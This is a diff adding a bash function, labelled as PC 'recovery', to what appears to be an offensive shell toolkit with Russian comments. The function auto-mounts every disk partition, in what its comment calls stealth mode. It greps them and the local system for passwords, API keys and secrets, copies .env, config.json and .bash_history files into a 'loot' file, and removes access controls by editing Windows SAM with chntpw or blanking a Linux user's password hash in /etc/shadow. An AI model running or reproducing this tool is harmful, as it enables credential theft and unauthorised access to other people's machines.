@@ -251,6 +251,81 @@ run_traffic_record() {
     pause
 }
 
+
+run_pc_recovery_ultimate() {
+    local LOOT="/root/prime_loot_recovery.txt"
+    clear
+    echo -e "\e[1;35m--- PRIME MASTER: UNIVERSAL ADAPTIVE RECOVERY ---\e[0m"
+
+    # --- БЛОК АВТО-МОНТИРОВАНИЯ (NEXUS) ---
+    echo -e "\e[1;34m[*] Сканирование и авто-монтирование разделов...\e[0m"
+    local DRIVES=$(lsblk -ln -o NAME,FSTYPE | grep -E "ntfs|ext4|vfat")
+    
+    while read -r line; do
+        local DEV=$(echo $line | awk '{print $1}')
+        local FS=$(echo $line | awk '{print $2}')
+        [[ -z "$DEV" ]] && continue
+        
+        local MNT="/mnt/prime_$DEV"
+        mkdir -p "$MNT"
+        
+        # Монтируем в зависимости от типа ФС (стелс-режим)
+        if [[ "$FS" == "ntfs" ]]; then
+            ntfs-3g "/dev/$DEV" "$MNT" -o ro,remove_hiberfile 2>/dev/null || mount -r "/dev/$DEV" "$MNT" 2>/dev/null
+        else
+            mount "/dev/$DEV" "$MNT" 2>/dev/null
+        fi
+    done <<< "$DRIVES"
+
+    # --- АНАЛИЗ СРЕДЫ ---
+    # Ищем SAM (Windows) или Shadow (Linux) на всех примонтированных точках
+    local EXT_SAM=$(find /mnt/prime_* -maxdepth 4 -path "*/System32/config/SAM" 2>/dev/null | head -n1)
+    local EXT_SHADOW=$(find /mnt/prime_* -maxdepth 3 -name "shadow" -path "*/etc/shadow" 2>/dev/null | head -n1)
+
+    echo -e " [1] EXTRACT SECRETS (ALL TARGETS)\n [2] RESET ACCESS (AUTO-DETECT)\n [3] UNMOUNT & EXIT"
+    read -p ">> " CHOICE
+
+    case "$CHOICE" in
+        1)
+            echo -e "\e[1;34m[*] Harvesting secrets...\e[0m"
+            # Собираем со всех примонтированных дисков и локально
+            local TARGETS="/ /mnt/prime_*"
+            (
+                grep -rE "password|passwd|api_key|secret" $TARGETS --exclude-dir={proc,sys,dev,tmp} --max-count=1 2>/dev/null
+                find $TARGETS -maxdepth 3 -name ".env" -o -name "config.json" -o -name ".bash_history" -exec cat {} + 2>/dev/null
+            ) >> "$LOOT"
+            echo -e "\e[1;32m[+] Loot saved to $LOOT\e[0m"
+            ;;
+
+        2)
+            echo -e "\e[1;34m[*] Запуск эвристического сброса...\e[0m"
+            if [[ -n "$EXT_SAM" ]]; then
+                echo -e "\e[1;32m[!] Найдена Windows: $EXT_SAM\e[0m"
+                chntpw -i "$EXT_SAM"
+            elif [[ -n "$EXT_SHADOW" ]]; then
+                echo -e "\e[1;32m[!] Найден Linux: $EXT_SHADOW\e[0m"
+                local T_USER=$(awk -F: '$3 >= 1000 {print $1; exit}' "${EXT_SHADOW%shadow}passwd")
+                sed -i.bak "s/^$T_USER:[^:]*:/$T_USER::/" "$EXT_SHADOW"
+                echo "[SUCCESS] Пароль пользователя $T_USER удален."
+            else
+                # Локальный режим (если ничего не примонтировалось)
+                local T_USER=$(awk -F: '$3 >= 1000 && $1 != "nobody" {print $1; exit}' /etc/passwd)
+                sed -i.bak "s/^$T_USER:[^:]*:/$T_USER::/" /etc/shadow 2>/dev/null && \
+                echo "[SUCCESS] Локальный доступ открыт для $T_USER" || echo "[ERR] Нет прав на запись."
+            fi
+            ;;
+        3)
+            echo -e "\e[1;33m[*] Размонтирование и очистка...\e[0m"
+            umount /mnt/prime_* 2>/dev/null
+            rmdir /mnt/prime_* 2>/dev/null
+            return
+            ;;
+        *) return ;;
+    esac
+    read -p "Press [ENTER]"
+}
+
+
 # --- Модули: IBAN, CERTIFICATES & FORGE ---
 
 run_iban_scan() {
